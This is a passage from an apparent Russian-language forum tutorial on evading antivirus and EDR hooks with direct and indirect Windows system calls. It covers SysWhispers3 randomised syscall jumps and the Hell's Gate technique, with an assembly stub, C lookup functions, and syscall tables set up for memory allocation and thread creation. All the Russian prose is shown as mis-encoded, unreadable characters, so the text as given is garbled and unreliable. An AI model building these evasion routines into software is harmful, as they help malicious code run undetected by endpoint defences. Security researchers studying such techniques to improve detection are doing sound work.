–ß—Ç–æ–±—ã –Ω–∞–π—Ç–∏ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, —Ñ—É–Ω–∫—Ü–∏—è SW2_GetSyscallNumber –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ö–µ—à –∏–º–µ–Ω–∏ —Ü–µ–ª–µ–≤–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏–Ω–¥–µ–∫—Å, –≥–¥–µ —ç—Ç–æ—Ç —Ö–µ—à —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –Ω–∞–π–¥–µ–Ω –≤ –º–∞—Å—Å–∏–≤–µ.<br />
<b>–ó–Ω–∞—á–µ–Ω–∏–µ –∏–Ω–¥–µ–∫—Å–∞ - —ç—Ç–æ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.</b><br />
<br />
–í–∏–∑—É–∞–ª—å–Ω—ã–π –ø—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785573407.png"
		data-src="https://osint42.org/attachments/1746785573407-png.209/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785573407-png.209/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785573407.png"
			title="1746785573407.png"
			width="311" height="681" loading="lazy" />
	</div><br />
<br />
<b>SysWhispers3:</b><br />
<br />
–ü–æ–º–Ω–∏—Ç–µ, —á—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∏–∑ —Ä–µ–∂–∏–º–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Ä–µ–∂–∏–º —è–¥—Ä–∞. –õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—Å–µ–≥–¥–∞ –¥–æ–ª–∂–Ω—ã –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –∏–∑ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ ntdll.dll. –ü–æ—ç—Ç–æ–º—É, –∫–æ–≥–¥–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤–∫–ª—é—á–µ–Ω–∞ –≤ –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª, –∫–∞–∫ —ç—Ç–æ –±—ã–ª–æ —Å SysWhispers –∏ SysWhispers2, –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∏–∑–≤–Ω–µ —ç—Ç–æ–≥–æ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, <b>–¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª, –≤—ã–ø–æ–ª–Ω—è—é—â–∏–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –º–æ–∂–µ—Ç –±—ã—Ç—å –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã—Ö –Ω–∞–º–µ—Ä–µ–Ω–∏–π.</b><br />
<br />
–û–±–Ω–æ–≤–ª–µ–Ω–∏—è –≤ Syswhispers3 –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ –±–ª–æ–≥–µ <a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/" target="_blank" class="link link--external" rel="noopener">&quot;SysWhispers —É–º–µ—Ä, –¥–∞ –∑–¥—Ä–∞–≤—Å—Ç–≤—É–µ—Ç SysWhispers!&quot;</a>. –ù–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–∞ —Å–≤–æ–¥–∫–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–π.<br />
<br />
–°–∞–º –∏—Å—Ö–æ–¥–Ω–∏–∫ –µ—Å—Ç—å –Ω–∞ –≥–∏—Ç—Ö–∞–±–µ:<a href="https://github.com/klezVirus/SysWhispers3" target="_blank" class="link link--external" rel="noopener">GitHub - klezVirus/SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls.</a><br />
<br />
<b>–ò–∑–º–µ–Ω–µ–Ω–∏—è –≤ SysWhispers3:</b><br />
<br />
–í–º–µ—Å—Ç–æ —Ç–æ–≥–æ —á—Ç–æ–±—ã –Ω–∞–ø—Ä—è–º—É—é –≤—ã–∑—ã–≤–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–∑ —Ñ—É–Ω–∫—Ü–∏–π —Å–±–æ—Ä–∫–∏, SysWhispers3 –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ ntdll.dll, –≤—ã–ø–æ–ª–Ω—è—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø—Ä—ã–∂–∫–∞ —Ç—É–¥–∞ –∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. <b>–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–µ—Ö–Ω–∏–∫—É –∫–æ—Å–≤–µ–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.</b><br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, Syswhispers3 –ø–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —Å –æ–ø—Ü–∏–µ–π jumper_randomized, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø—Ä—ã–∂–æ–∫ –∫ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç —Å–ª—É—á–∞–π–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –ù–∞–ø—Ä–∏–º–µ—Ä, –ø—Ä–∏ –≤—ã–∑–æ–≤–µ NtAllocateVirtualMemory —Å —ç—Ç–æ–π –æ–ø—Ü–∏–µ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥–µ—Ç –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω –ø—Ä—ã–∂–æ–∫, –Ω–µ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç NtAllocateVirtualMemory –≤ ntdll.dll. –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –¥—Ä—É–≥–æ–º—É —Å–∏—Å—Ç–µ–º–Ω–æ–º—É –≤—ã–∑–æ–≤—É, —Ç–∞–∫–æ–º—É –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—è NtTestAlert.<br />
<br />
<b>–ö–∞–∫ –∏ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–π –≤–µ—Ä—Å–∏–∏, Syswhispers3 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –º–µ—Ç–æ–¥ —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∏ –ø–æ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤.<br />
<br />
–í—ã—Ö–æ–¥–Ω–æ–π –ø—Ä–∏–º–µ—Ä SysWhispers3: </b><br />
<br />
SysWhispers3 –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∑–∞–≥–ª—É—à–∫–∏ –≤—ã–∑–æ–≤–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ NtMapViewOfSection. –í—ã—Ö–æ–¥ Syswhispers3 –≤—ã–≥–ª—è–¥–∏—Ç –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ Syswhispers2 —Å –æ—Å–Ω–æ–≤–Ω—ã–º –æ—Ç–ª–∏—á–∏–µ–º –≤ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –≤—ã–∑–æ–≤–∞—Ö —Ñ—É–Ω–∫—Ü–∏–π SW3_GetRandomSyscallAddress –∏ SW3_GetSyscallNumber, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–∫–∞–∑–∞–Ω—ã –∏ –æ–±—ä—è—Å–Ω–µ–Ω—ã –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785588464.png"
		data-src="https://osint42.org/attachments/1746785588464-png.210/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785588464-png.210/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785588464.png"
			title="1746785588464.png"
			width="1721" height="1036" loading="lazy" />
	</div><br />
<br />
<b>–ú–æ–¥—É–ª—å Syscalls-asm.x64.asm</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>Syscalls-asm.x64.asm

.code

EXTERN SW3_GetSyscallNumber: PROC

EXTERN SW3_GetRandomSyscallAddress: PROC

NtMapViewOfSection PROC
    mov [rsp +8], rcx                      ; –°–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä—ã.
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h
    mov ecx, 01A80161Bh                     ; –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ö–µ—à —Ñ—É–Ω–∫—Ü–∏–∏ –≤ ECX.
    call SW3_GetRandomSyscallAddress        ; –ü–æ–ª—É—á–∏—Ç—å —Å–º–µ—â–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–∑ –¥—Ä—É–≥–æ–≥–æ API.
    mov r15, rax                            ; –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –∞–¥—Ä–µ—Å —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ {–ø–æ—Å–∫–æ–ª—å–∫—É SW3_GetRandomSyscallAddress –≤–µ—Ä–Ω–µ—Ç –∞–¥—Ä–µ—Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ &#039;syscall&#039; –≤ —Ä–µ–≥–∏—Å—Ç—Ä–µ rax}
    mov ecx, 01A80161Bh                     ; –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ö–µ—à —Ñ—É–Ω–∫—Ü–∏–∏ —Å–Ω–æ–≤–∞ –≤ ECX (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ).
    call SW3_GetSyscallNumber               ; –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å —Ö–µ—à —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. {–¢–µ–ø–µ—Ä—å, eax —Å–æ–¥–µ—Ä–∂–∏—Ç SSN}
    add rsp, 28h
    mov rcx, [rsp+8]                        ; –í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä—ã.
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    jmp r15                                 ; –ü–µ—Ä–µ–π—Ç–∏ –∫ -&gt; –í—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. {r15 - —ç—Ç–æ –∞–¥—Ä–µ—Å —Å–ª—É—á–∞–π–Ω–æ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ &#039;syscall&#039; –≤ ntdll.dll}
NtMapViewOfSection ENDP

end</code></pre>
	</div>
</div><br />
<b>–ú–æ–¥—É–ª—å Syscalls.c<br />
<br />
SW3_GetSyscallNumber –∏ SW3_GetRandomSyscallAddress:</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è SW3_GetSyscallNumber –Ω–∞—Ö–æ–¥–∏—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤, –∞ SW3_GetRandomSyscallAddress –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∞–¥—Ä–µ—Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤–Ω—É—Ç—Ä–∏ ntdll.dll, –ø–æ—Ç–æ–º—É —á—Ç–æ –±—ã–ª–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞, –æ–ø—Ü–∏—è jumper_randomized.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i &lt; SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}


EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return NULL;

    DWORD index = ((DWORD) rand()) % SW3_SyscallList.Count;

    while (FunctionHash == SW3_SyscallList.Entries[index].Hash){
        // Spoofing the syscall return address
        index = ((DWORD) rand()) % SW3_SyscallList.Count;
    }
    return SW3_SyscallList.Entries[index].SyscallAddress;
}</code></pre>
	</div>
</div><br />
<b>–í—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –ø—Ä–∏ –ø–æ–º–æ—â–∏ Hell&#039;s Gate<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–ü–æ–º–Ω–∏—Ç–µ, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ (syscalls) ‚Äî —ç—Ç–æ —Å–ø–æ—Å–æ–± –æ–±–æ–π—Ç–∏ —Ö—É–∫–∏ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ, –≤—ã–ø–æ–ª–Ω—è—è —Å–±–æ—Ä–∫—É –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—Ä—É—á–Ω—É—é.<br />
<br />
&quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; (Hell&#039;s Gate) - —ç—Ç–æ –¥—Ä—É–≥–∞—è —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –ß–∏—Ç–∞—è ntdll.dll, &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –º–æ–≥—É—Ç –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –Ω–∞—Ö–æ–¥–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –∏ –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω—è—Ç—å –∏—Ö –∏–∑ –¥–≤–æ–∏—á–Ω–æ–≥–æ –∫–æ–¥–∞.<br />
<br />
–°—Ç–∞—Ç—å—è –æ &quot;–í—Ä–∞—Ç–∞—Ö –ê–¥–∞&quot; –¥–æ—Å—Ç—É–ø–Ω–∞ <a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf" target="_blank" class="link link--external" rel="noopener">–∑–¥–µ—Å—å.</a><br />
<br />
<b>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞—é—Ç &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot;</b><br />
<br />
–í —Å—Ç–∞—Ç—å–µ –≤—ã—à–µ –º—ã –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª–∏ –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã —Å –ø–æ–º–æ—â—å—é SysWhispers. SSN –±—ã–ª –ª–∏–±–æ –∂—ë—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω, –ª–∏–±–æ –Ω–∞–π–¥–µ–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–µ—Ç–æ–¥–∞ —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∏ –ø–æ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å SSN –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot;, —Å –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –∏—Å–ø–æ–ª—å–∑—É—é—Ç –¥—Ä—É–≥–æ–π –ø–æ–¥—Ö–æ–¥ –∫ –ø–æ–∏—Å–∫—É SSN.<br />
<br />
–ü–æ–¥—Ö–æ–¥ &quot;–í—Ä–∞—Ç –ê–¥–∞&quot; –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø–æ–∏—Å–∫–µ SSN –≤–Ω—É—Ç—Ä–∏ –æ–ø–∫–æ–¥–æ–≤ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞—Ç–µ–º –≤—ã–∑—ã–≤–∞—é—Ç—Å—è –≤ –µ–≥–æ —Ñ—É–Ω–∫—Ü–∏—è—Ö —Å–±–æ—Ä–∫–∏.<br />
<br />
<b>–†–∞–∑–±–æ—Ä &quot;–í—Ä–∞—Ç –ê–¥–∞&quot; </b><br />
<br />
–°–ª–æ–∂–Ω–æ—Å—Ç—å –∫–æ–¥–∞ —Ç—Ä–µ–±—É–µ—Ç —Ä–∞–∑–±–∏–µ–Ω–∏—è –æ–±—ä—è—Å–Ω–µ–Ω–∏—è –Ω–∞ –±–æ–ª–µ–µ –º–µ–ª–∫–∏–µ –ø–æ–¥—Ä–∞–∑–¥–µ–ª—ã –¥–ª—è –±–æ–ª–µ–µ –ª—ë–≥–∫–æ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–ö–æ–¥ &quot;–í—Ä–∞—Ç –ê–¥–∞&quot; –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE_ENTRY. –≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –∞–¥—Ä–µ—Å, —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ SSN. –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;             // –ê–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    DWORD64 dwHash;               // –•–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    WORD    wSystemCall;          // SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
–ù–∞–ø—Ä–∏–º–µ—Ä, NtAllocateVirtualMemory –±—É–¥–µ—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –∫–∞–∫ VX_TABLE_ENTRY NtAllocateVirtualMemory.<br />
<br />
<b>–¢–∞–±–ª–∏—Ü–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤</b><br />
<br />
–ò—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã —Ö—Ä–∞–Ω—è—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ –¥—Ä—É–≥–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã, VX_TABLE. –ü–æ—Å–∫–æ–ª—å–∫—É –∫–∞–∂–¥—ã–π —ç–ª–µ–º–µ–Ω—Ç –≤ VX_TABLE —è–≤–ª—è–µ—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–æ–º, –∫–∞–∂–¥—ã–π —ç–ª–µ–º–µ–Ω—Ç –±—É–¥–µ—Ç —Ç–∏–ø–∞ VX_TABLE_ENTRY.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è </b><br />
<br />
–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏ RtlGetThreadEnvironmentBlock, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è TEB. –≠—Ç–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ ntdll.dll —á–µ—Ä–µ–∑ PEB (–ø–æ–º–Ω–∏—Ç–µ, —á—Ç–æ PEB –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ TEB). –ó–∞—Ç–µ–º —ç–∫—Å–ø–æ—Ä—Ç–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥ ntdll.dll –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetImageExportDirectory. –≠–∫—Å–ø–æ—Ä—Ç–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ø—É—Ç–µ–º –∞–Ω–∞–ª–∏–∑–∞ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ DOS –∏ Nt, –∫–∞–∫ –±—ã–ª–æ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö.<br />
<br />
